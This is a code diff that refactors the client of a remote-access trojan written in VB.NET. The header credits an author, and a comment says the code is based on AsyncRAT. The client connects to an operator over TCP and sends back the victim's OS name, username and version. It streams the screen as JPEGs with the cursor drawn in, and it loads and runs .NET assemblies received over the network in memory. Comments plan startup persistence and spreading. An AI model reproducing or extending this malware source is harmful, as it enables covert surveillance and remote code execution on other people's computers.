@@ -15,6 +15,14 @@ Imports System.Drawing.Imaging
 ''||       AUTHOR Arsium       ||
 ''||       github : https://github.com/arsium       ||
 Public Class C
+#Region "Global"
+    Public Shared TcpV As TcpClient
+    Public Shared ViewerDesk As Thread
+    Public Shared ns As NetworkStream
+    Public Shared CLI As TcpClient
+    ' Public Shared p As StringBuilder
+#End Region
+#Region "Client Functions"
     Public Shared Sub Check()
 
         Dim b As Byte() = System.Text.Encoding.UTF8.GetBytes("")
@@ -44,25 +52,13 @@ Public Class C
 
         End While
     End Sub
-
-    ''
-
     Public Shared Sub Main()
 
-
         SetThreadExecutionState(EXECUTION_STATE.ES_CONTINUOUS Or EXECUTION_STATE.ES_DISPLAY_REQUIRED Or EXECUTION_STATE.ES_SYSTEM_REQUIRED)
-
 
         ''ADD PERMISSION
         ''ADD STARTUP
         ''ADD SPREAD
-
-
-
-
-
-
-
 
         Try
             CLI = New TcpClient
@@ -102,12 +98,9 @@ Public Class C
 
 
     End Sub
-
-
     Public Shared Async Sub T(ByVal l As NetworkStream)
 
-
-        p = New StringBuilder
+        'p = New StringBuilder
 
         Try
             Dim b(150 * 4096) As Byte
@@ -124,22 +117,22 @@ Public Class C
                         Dim Message As String = Encoding.Default.GetString(b, 0, lu)
 
 
-                        p.Append(Message)
+                        'p.Append(Message)
 
 
-                        If p.ToString.EndsWith("|GETID|") Then
-                            Dim aze As New Microsoft.VisualBasic.Devices.Computer
-                            Dim ks As String = aze.Info.OSFullName & "|IDD|" & Environment.UserName & "|IDD|" & aze.Info.OSVersion & "|IDDEND|"
+                        If Message.EndsWith("|GETID|") Then
+                            Dim Info As New Microsoft.VisualBasic.Devices.Computer
+                            Dim ks As String = Info.Info.OSFullName & "|IDD|" & Environment.UserName & "|IDD|" & Info.Info.OSVersion & "|IDDEND|"
 
                             CLI.GetStream.Write(System.Text.Encoding.UTF8.GetBytes(ks), 0, System.Text.Encoding.UTF8.GetBytes(ks).Length)
 
-                            p.Clear()
+                            ' p.Clear()
 
-                        ElseIf p.ToString.EndsWith("|ENDING|") Then
+                        ElseIf Message.EndsWith("|ENDING|") Then
 
-                            Dim j As String = p.ToString.Replace("|ENDING|", "")
+                            Dim j As String = Message.Replace("|ENDING|", "")
 
-                            p.Clear()
+                            'p.Clear()
 
                             '            Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|RBT|" & "|ENDING|"
                             Dim j2 As String() = Microsoft.VisualBasic.Strings.Split(j, "|SP1|")
@@ -156,7 +149,7 @@ Public Class C
                             SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
                             EmptyWorkingSet(Process.GetCurrentProcess.Handle)
 
-                        ElseIf p.ToString = "|CLOSETHISSHIT|" Then
+                        ElseIf Message = "|CLOSETHISSHIT|" Then
 
 
 
@@ -164,15 +157,15 @@ Public Class C
                             NtTerminateProcess(Process.GetCurrentProcess.Handle, 0)
 
 
-                        ElseIf p.ToString = "|CLOSEONLY|" Then
+                        ElseIf Message = "|CLOSEONLY|" Then
                             NtTerminateProcess(Process.GetCurrentProcess.Handle, 0)
                             ' Environment.Exit(0)
 
 
-                        ElseIf p.ToString.EndsWith("|SRDV|") Then
+                        ElseIf Message.EndsWith("|SRDV|") Then
 
 
-                            p.Clear()
+                            ' p.Clear()
 
                             TcpV = New TcpClient
 
@@ -184,9 +177,9 @@ Public Class C
 
                             ViewerDesk.Start()
 
-                        ElseIf p.ToString.EndsWith("|TRDV|") Then
+                        ElseIf Message.EndsWith("|TRDV|") Then
 
-                            p.Clear()
+                            '  p.Clear()
 
                             Try
                                 ViewerDesk.Abort()
@@ -215,15 +208,34 @@ Public Class C
         End Try
     End Sub
 
-    Public Shared TcpV As TcpClient
-    Public Shared ViewerDesk As Thread
-    Public Shared ns As NetworkStream
-    Public Shared CLI As TcpClient
-    Public Shared p As StringBuilder
+    Public Shared Async Sub Launch(ByVal k As TcpClient, ByVal mp As String, Optional ByVal P As String = "")
+
+        Dim assemblytoload As System.Reflection.Assembly = System.Reflection.Assembly.Load(Encoding.Default.GetBytes(mp))
+
+        Dim method As System.Reflection.MethodInfo = assemblytoload.[GetType]("PL.MainCL").GetMethod("ST")
 
 
+        Dim obj As Object = assemblytoload.CreateInstance(method.Name)
+
+
+
+        Await Task.Run(Sub() method.Invoke(obj, New Object() {k, P}))
+
+
+
+        assemblytoload = Nothing
+        method = Nothing
+        GC.Collect()
+        GC.WaitForPendingFinalizers()
+        SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
+        EmptyWorkingSet(Process.GetCurrentProcess.Handle)
+    End Sub
+#End Region
+#Region "RemoteViewer"
     Public Shared Function Desk() As Image
+
         Dim primaryMonitorSize As Size = SystemInformation.PrimaryMonitorSize
+
         Dim iamage As New Bitmap(primaryMonitorSize.Width, primaryMonitorSize.Height)
         'Dim iamage As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
 
@@ -240,52 +252,46 @@ Public Class C
 
         Dim WB = GetCursorPos(gaz)
 
-
-
-
         Dim hj As New CURSORINFOHELPER
 
         hj.cbSize = Marshal.SizeOf(hj)
+
         GetCursorInfo(hj)
 
-
         If hj.flags = &H1 Then ''SO IMPORTANT TO CHECK IF CURSOR IS NOT HIDDEN ! Else will crash without error message
-
             '
             graphics.DrawIcon(Icon.FromHandle(hj.hCursor), gaz.X, gaz.Y)
+
         End If
 
-
         graphics.Dispose()
-
-
-
 
         ''Based On the vbnet version of AsyncRat (code below)
 
 
         Dim o As Integer = (primaryMonitorSize.Width / 100) * 80
+
         Dim o2 As Integer = (primaryMonitorSize.Height / 100) * 80
-
-
-
 
         Dim Resize As New Bitmap(o, o2)
 
         Dim g2 As Graphics = Graphics.FromImage(Resize)
+
         g2.CompositingQuality = CompositingQuality.HighSpeed
+
         g2.DrawImage(iamage, New Rectangle(0, 0, o, o2), New Rectangle(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), GraphicsUnit.Pixel)
 
         Dim encoderParameter As EncoderParameter = New EncoderParameter(Imaging.Encoder.Quality, 75)
+
         Dim encoderInfo As ImageCodecInfo = GetEncoderInfo(ImageFormat.Jpeg)
+
         Dim encoderParameters As EncoderParameters = New EncoderParameters(1)
+
         encoderParameters.Param(0) = encoderParameter
 
         Dim MS As New IO.MemoryStream
+
         Resize.Save(MS, encoderInfo, encoderParameters)
-
-
-
 
         Return Image.FromStream(MS)
     End Function
@@ -336,43 +342,18 @@ Public Class C
             EmptyWorkingSet(Process.GetCurrentProcess.Handle)
         End While
     End Sub
-
-
-
-
-    Public Shared Async Sub Launch(ByVal k As TcpClient, ByVal mp As String, Optional ByVal P As String = "")
-
-        Dim assemblytoload As System.Reflection.Assembly = System.Reflection.Assembly.Load(Encoding.Default.GetBytes(mp))
-
-        Dim method As System.Reflection.MethodInfo = assemblytoload.[GetType]("PL.MainCL").GetMethod("ST")
-
-
-        Dim obj As Object = assemblytoload.CreateInstance(method.Name)
-
-
-
-        Await Task.Run(Sub() method.Invoke(obj, New Object() {k, P}))
-
-
-
-        assemblytoload = Nothing
-        method = Nothing
-        GC.Collect()
-        GC.WaitForPendingFinalizers()
-        SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
-        EmptyWorkingSet(Process.GetCurrentProcess.Handle)
-    End Sub
-
-
-
+#End Region
+#Region "NativeAPI"
     Declare Function SetProcessWorkingSetSize Lib "kernel32.dll" (ByVal process As IntPtr, ByVal minimumWorkingSetSize As Integer, ByVal maximumWorkingSetSize As Integer) As Integer
 
     <DllImport("ntdll.dll")>
     Public Shared Function NtTerminateProcess(ByVal hfandle As IntPtr, ByVal ErrorStatus As Integer) As UInteger
+
     End Function
 
     <DllImport("psapi")>
     Public Shared Function EmptyWorkingSet(ByVal hfandle As IntPtr) As Boolean
+
     End Function
 
     <DllImport("kernel32.dll", SetLastError:=True)>
@@ -383,31 +364,36 @@ Public Class C
     Public Enum EXECUTION_STATE As UInteger
 
         ES_CONTINUOUS = &H80000000UI
+
         ES_DISPLAY_REQUIRED = &H2
+
         ES_SYSTEM_REQUIRED = &H1
 
     End Enum
-
-
-
 
     <DllImport("user32.dll")>
     Public Shared Function GetCursorInfo(ByRef pci As CURSORINFOHELPER) As Boolean
 
     End Function
+
     <DllImport("user32.dll")>
     Public Shared Function GetCursorPos(<Out> ByRef lpPoint As Point) As Boolean
 
     End Function
 
-
     <StructLayout(LayoutKind.Sequential)>
     Structure CURSORINFOHELPER
+
         Public cbSize As Int32
+
         Public flags As Int32
+
         Public hCursor As IntPtr
+
         Public ptScreenPos As Point
+
     End Structure
 
+#End Region
 
 End Class
